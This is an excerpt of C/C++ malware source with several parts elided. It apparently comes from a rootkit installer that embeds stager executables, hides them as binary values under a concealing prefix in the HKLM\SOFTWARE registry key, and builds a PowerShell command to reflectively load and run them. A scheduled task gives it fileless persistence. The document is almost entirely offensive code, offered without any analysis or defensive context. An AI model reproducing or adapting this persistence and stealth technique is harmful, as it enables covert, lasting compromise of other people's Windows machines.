...
int main()
{
	...
	LPBYTE stager, csStager;
	DWORD stagerSize, csStagerSize;
	if (!GetResource(IDR_STAGER, "EXE", &stager, &stagerSize)) {
		MessageBox(NULL, L"Failed to load stager from resources.", L"Error", MB_ICONERROR);
		return 0;
	}
	if (!GetResource(CS_STAGER, "EXE", &csStager, &csStagerSize)) {
		MessageBox(NULL, L"Failed to load CsStager from resources.", L"Error", MB_ICONERROR);
		return 0;
	}
	...
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"csStager", 0, REG_BINARY, csStager, csStagerSize) != ERROR_SUCCESS) {
		MessageBox(NULL, L"Failed to write stager to registry.", L"Error", MB_ICONERROR);
		return 0;
	}
	...
	if (!powershellCommand) {
		MessageBox(NULL, L"Failed to create powershell command.", L"Error", MB_ICONERROR);
		return 0;
	}
	MessageBoxW(NULL, powershellCommand, L"Powershell Command", MB_ICONINFORMATION);
	...
	{
		MessageBox(NULL, L"Failed to create scheduled task.", L"Error", MB_ICONERROR);
...
LPWSTR GetPowershellCommand()
{
	...
	/*
	// Load CsStager.exe from registry and invoke
	StrCatW
	(
		command,
		L"[Reflection.Assembly]::Load"
		...
		L"[Microsoft.Win32.Registry]::LocalMachine"
		L".OpenSubkey(`SOFTWARE`)"
		L".GetValue(`" HIDE_PREFIX L"csStager`)"
		L")"
		L".EntryPoint"
		L".Invoke($Null,$Null)"
	);
